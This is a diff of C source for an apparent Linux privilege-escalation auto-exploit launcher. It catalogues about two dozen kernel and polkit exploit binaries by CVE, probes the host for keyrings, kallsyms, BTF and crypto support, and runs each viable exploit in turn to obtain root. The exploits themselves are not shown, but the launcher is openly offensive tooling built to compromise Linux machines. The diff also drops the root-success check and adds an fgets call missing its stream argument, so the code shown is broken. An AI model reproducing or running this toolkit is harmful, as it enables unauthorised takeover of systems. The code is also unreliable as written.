@@ -1,12 +1,6 @@
 /*
  * Linux LPE Auto-Exploit Toolkit 2026 - UNIVERSAL
  * BOB RESEARCH LABS
- * 
- * IMPROVEMENTS:
- * - Fully static compilation (no missing libs)
- * - Better kernel compatibility checks
- * - Verbose mode for debugging
- * - Enhanced error reporting
  */
 
 #define _GNU_SOURCE
@@ -23,7 +17,7 @@
 #include <sys/wait.h>
 #include <unistd.h>
 
-#define MAX_EXPLOITS 23
+#define MAX_EXPLOITS 24
 #define MAX_NAME 64
 #define MAX_PATH 256
 #define VERSION "2.5-universal"
@@ -39,7 +33,6 @@ static Exploit exploits[MAX_EXPLOITS];
 static int exploit_count = 0;
 static int viable_count = 0;
 
-// ANSI colors
 #define RED     "\033[1;31m"
 #define GREEN   "\033[1;32m"
 #define YELLOW  "\033[1;33m"
@@ -57,7 +50,8 @@ static void add_exploit(const char *binary, const char *name, const char *cve) {
 }
 
 static void init_exploits(void) {
-    // 2026 CVEs (newest first)
+    // 2026, newest first
+    add_exploit("assoc-array-static", "Assoc Array Shortcut", "no CVE (keyrings)");
     add_exploit("packet-edit-meme-static", "PACKET_EDIT_MEME", "CVE-2026-46331");
     add_exploit("fragnesia-static", "Fragnesia", "CVE-2026-46300");
     add_exploit("fragnesia2-static", "Fragnesia v2", "Fragnesia v2");
@@ -71,21 +65,15 @@ static void init_exploits(void) {
     add_exploit("copyfail-go-static", "CopyFail", "CVE-2026-31431");
     add_exploit("ipv6-frag-escape-static", "IPv6 Frag Escape", "6.12.x container escape");
     add_exploit("pintheft-static", "PinTheft", "PinTheft");
-    // 2024 CVEs
     add_exploit("nft-uaf-static", "nft UAF", "CVE-2024-1086");
-    // 2023 CVEs
     add_exploit("ovfs-fuse-static", "OvFS+FUSE", "CVE-2023-0386");
-    // 2022 CVEs
     add_exploit("nft-uaf2-static", "nft UAF2", "CVE-2022-2586");
     add_exploit("dirtypipe-static", "DirtyPipe", "CVE-2022-0847");
-    // 2021 CVEs
     add_exploit("pwnkit-new-static", "PwnKit", "CVE-2021-4034");
     add_exploit("polkit-dbus-static", "Polkit D-Bus", "CVE-2021-3560");
     add_exploit("overlayfs-static", "OverlayFS", "CVE-2021-3493");
     add_exploit("netfilter-oob-static", "netfilter OOB", "CVE-2021-22555");
-    // Problematic exploits (moved to bottom)
     add_exploit("pidfd-race-static", "pidfd-race", "CVE-2026-46333");
-    // Other
     add_exploit("docker-sock-static", "Docker Socket", "Docker Socket");
 }
 
@@ -93,10 +81,32 @@ static int file_exists(const char *path) {
     return access(path, F_OK) == 0;
 }
 
+static int file_contains(const char *path, const char *needle) {
+    FILE *f = fopen(path, "r");
+    char line[256];
+    int hit = 0;
+
+    if (!f) return 0;
+    while (fgets(line, sizeof(line), f))
+        if (strstr(line, needle)) { hit = 1; break; }
+    fclose(f);
+    return hit;
+}
+
 static int check_viable(const char *binary) {
     if (!file_exists(binary)) return 0;
-    
-    // Special checks
+
+    if (strstr(binary, "assoc-array")) {
+        /* Needs unprivileged keyrings, AF_ALG(xts) and a way to resolve
+         * key_type_user (BTF or readable kallsyms). */
+        if (geteuid() == 0) return 0;
+        if (!file_exists("/proc/key-users")) return 0;
+        if (access("/sys/kernel/btf/vmlinux", R_OK) != 0 &&
+            !file_contains("/proc/kallsyms", " key_type_user") &&
+            !file_contains("/proc/kallsyms", "T key_type_user"))
+            return 0;
+        if (!file_contains("/proc/crypto", "xts(aes)")) return 0;
+    }
     if (strstr(binary, "cifswitch")) {
         if (!file_exists("/usr/sbin/cifs.upcall") && !file_exists("/sbin/cifs.upcall"))
             return 0;
@@ -123,7 +133,6 @@ static int check_viable(const char *binary) {
         if (!file_exists("/usr/bin/fusermount3") && !file_exists("/bin/fusermount3"))
             return 0;
     }
-    
     return 1;
 }
 
@@ -140,21 +149,21 @@ static void print_header(void) {
 static void print_system_info(void) {
     struct utsname uts;
     struct passwd *pw = getpwuid(getuid());
-    
+
     uname(&uts);
-    
+
     printf(CYAN "[*] System Information:\n" RESET);
     printf("    OS: " WHITE "%s %s" RESET "\n", uts.sysname, uts.release);
     printf("    Kernel: " WHITE "%s" RESET "\n", uts.release);
     printf("    Architecture: " WHITE "%s" RESET "\n", uts.machine);
-    printf("    User: " WHITE "%s" RESET " (uid=%d)\n\n", 
+    printf("    User: " WHITE "%s" RESET " (uid=%d)\n\n",
            pw ? pw->pw_name : "unknown", getuid());
 }
 
 static void analyze_exploits(void) {
     printf(CYAN "[*] Initializing toolkit...\n" RESET);
     printf(CYAN "[*] Setting permissions for exploit binaries...\n" RESET);
-    
+
     for (int i = 0; i < exploit_count; i++) {
         if (file_exists(exploits[i].binary)) {
             chmod(exploits[i].binary, 0755);
@@ -162,21 +171,21 @@ static void analyze_exploits(void) {
         }
     }
     printf("\n");
-    
+
     printf(CYAN "[*] Analyzing vulnerabilities...\n" RESET "\n");
-    
+
     printf(WHITE);
     printf("╔══════════════════════════════════════════════════════════════╗\n");
     printf("║                    Available Exploits                       ║\n");
     printf("╚══════════════════════════════════════════════════════════════╝\n");
     printf(RESET "\n");
-    
+
     viable_count = 0;
     for (int i = 0; i < exploit_count; i++) {
         exploits[i].viable = check_viable(exploits[i].binary);
-        
+
         if (exploits[i].viable) {
-            printf("[%d]  " GREEN "✓" RESET " %s (%s)\n", 
+            printf("[%d]  " GREEN "✓" RESET " %s (%s)\n",
                    i + 1, exploits[i].name, exploits[i].cve);
             viable_count++;
         } else if (!file_exists(exploits[i].binary)) {
@@ -187,8 +196,8 @@ static void analyze_exploits(void) {
                    i + 1, exploits[i].name, exploits[i].cve);
         }
     }
-    
-    printf("\n" CYAN "[*] Found " GREEN "%d" CYAN " viable exploits for this system\n" RESET "\n", 
+
+    printf("\n" CYAN "[*] Found " GREEN "%d" CYAN " viable exploits for this system\n" RESET "\n",
            viable_count);
 }
 
@@ -206,34 +215,22 @@ static void show_menu(void) {
 
 static int run_exploit(int idx) {
     if (idx < 0 || idx >= exploit_count) return -1;
-    
+
     Exploit *e = &exploits[idx];
     printf(GREEN "[+] Selected: %s (%s)\n" RESET, e->name, e->cve);
     printf(CYAN "[*] Running exploit...\n" RESET "\n");
     printf("════════════════════════════════════════════════════════════════\n");
-    
-    // Save original UID to check if we got root
-    uid_t orig_uid = getuid();
-    uid_t orig_euid = geteuid();
-    
+
     char cmd[MAX_PATH + 16];
     snprintf(cmd, sizeof(cmd), "./%s", e->binary);
-    
+
     int status = system(cmd);
     int exit_code = WIFEXITED(status) ? WEXITSTATUS(status) : -1;
-    
-    // Check if we actually got root after exploit
-    if (geteuid() == 0 && getuid() == 0) {
-        // Actually got root!
+
+    // A child cannot make the toolkit itself root; exit code is the signal.
+    if (exit_code == 0)
         return 0;
-    }
-    
-    // If exploit claims success but we're not root, it's a false positive
-    if (exit_code == 0 && geteuid() != 0) {
-        printf(YELLOW "[-] Exploit reported success but we're not root (false positive)\n" RESET);
-        return -1;
-    }
-    
+
     return exit_code;
 }
 
@@ -241,28 +238,26 @@ static void auto_run(void) {
     printf(GREEN "[*] Auto-exploitation mode enabled\n" RESET);
     printf(CYAN "[*] Will try %d viable exploits in order...\n" RESET "\n", viable_count);
     printf(YELLOW "[!] Note: Some exploits may hang or crash. Press Ctrl+C to skip.\n" RESET "\n");
-    
+
     int count = 1;
     for (int i = 0; i < exploit_count; i++) {
         if (!exploits[i].viable) continue;
-        
-        printf(CYAN "[%d/%d] Trying: %s (%s)...\n" RESET, 
+
+        printf(CYAN "[%d/%d] Trying: %s (%s)...\n" RESET,
                count, viable_count, exploits[i].name, exploits[i].cve);
-        
+
         int result = run_exploit(i);
-        
+
         if (result == 0) {
-            printf(GREEN "\n[+] SUCCESS! Exploit worked - you should be root now.\n" RESET);
+            printf(GREEN "\n[+] SUCCESS! Exploit worked.\n" RESET);
             return;
         }
-        
+
         printf(YELLOW "[-] Failed. Moving to next exploit...\n" RESET "\n");
-        
-        // Small delay between exploits to allow system to stabilize
-        usleep(500000); // 0.5 second delay
+        usleep(500000);
         count++;
     }
-    
+
     printf(RED "[-] All exploits failed. System may be fully patched.\n" RESET);
 }
 
@@ -271,7 +266,7 @@ static void show_info(void) {
     printf(WHITE "════════════════════════════════════════════════════════════════\n" RESET);
     printf(WHITE "                 EXPLOIT INFORMATION\n" RESET);
     printf(WHITE "════════════════════════════════════════════════════════════════\n" RESET "\n");
-    
+
     for (int i = 0; i < exploit_count; i++) {
         printf(CYAN "[%d] %s - %s\n" RESET, i + 1, exploits[i].name, exploits[i].cve);
         printf("    Binary: %s\n", exploits[i].binary);
@@ -284,14 +279,13 @@ static void show_info(void) {
         }
         printf("\n");
     }
-    
+
     printf(WHITE "════════════════════════════════════════════════════════════════\n" RESET "\n");
     printf("Press Enter to return to menu...");
     getchar();
 }
 
 int main(int argc, char *argv[]) {
-    // Change to script directory
     if (argc > 0) {
         char *dir = strdup(argv[0]);
         char *slash = strrchr(dir, '/');
@@ -303,37 +297,35 @@ int main(int argc, char *argv[]) {
         }
         free(dir);
     }
-    
+
     init_exploits();
     print_header();
     print_system_info();
     analyze_exploits();
-    
+
     if (viable_count == 0) {
         printf(RED "[-] No viable exploits found for this system.\n" RESET);
         return 1;
     }
-    
+
     while (1) {
         show_menu();
         printf("Your choice: ");
         fflush(stdout);
-        
+
         char input[16];
-        if (!fgets(input, sizeof(input), stdin)) break;
-        
-        // Remove newline
+        if (!fgets(input, sizeof(input))) break;
+
         input[strcspn(input, "\n")] = 0;
-        
-        // Check for "00" exit command BEFORE atoi()
+
         if (strcmp(input, "00") == 0) {
             printf(CYAN "[*] Exiting...\n" RESET);
             break;
         }
-        
+
         int choice = atoi(input);
         printf("\n");
-        
+
         if (choice == 0) {
             auto_run();
             break;
@@ -355,6 +347,6 @@ int main(int argc, char *argv[]) {
             printf(RED "[-] Invalid choice\n" RESET "\n");
         }
     }
-    
+
     return 0;
 }
